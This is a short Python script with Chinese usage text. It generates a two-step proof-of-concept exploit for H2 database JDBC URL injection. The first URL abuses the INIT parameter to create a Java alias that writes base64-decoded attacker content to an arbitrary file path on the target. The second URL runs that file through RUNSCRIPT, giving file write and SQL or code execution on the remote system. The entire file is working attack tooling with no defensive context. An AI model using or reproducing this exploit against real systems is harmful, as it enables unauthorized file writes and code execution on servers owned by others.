import sys
import base64


def main():
    if len(sys.argv) != 3:
        print(f"用法: python {sys.argv[0]} <本地sql文件路径> <远程环境写入sql文件路径>")
        print(f'如: python {sys.argv[0]} "./poc.sql" "D:/test/aaa"')
        sys.exit(1)

    a = sys.argv[1]
    b = sys.argv[2]

    with open(a, "r", encoding="utf-8") as f:
        base64_data = f.read().strip()

    encoded = base64.b64encode(base64_data.encode("utf-8")).decode("utf-8")

    step1 = (
        "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;"
        "INIT=CREATE ALIAS IF NOT EXISTS BASE64_TO_File AS "
        "'void base64ToFile(String base64Data, String filePath) throws java.io.IOException "
        "{byte[] jarBytes = java.util.Base64.getDecoder().decode(base64Data)\\\\;"
        "try (java.io.FileOutputStream fos = new java.io.FileOutputStream(filePath)) "
        "{fos.write(jarBytes)\\\\;}}'\\\\;"
        f"CALL BASE64_TO_File('{encoded}', '{b}')\\\\;"
    )
    step2 = f"jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM '{b}'"

    print("-" * 100)
    print("step1 poc如下:")
    print()
    print(step1)
    print("-" * 100)
    print("step2 poc如下:")
    print()
    print(step2)


if __name__ == "__main__":
    main()
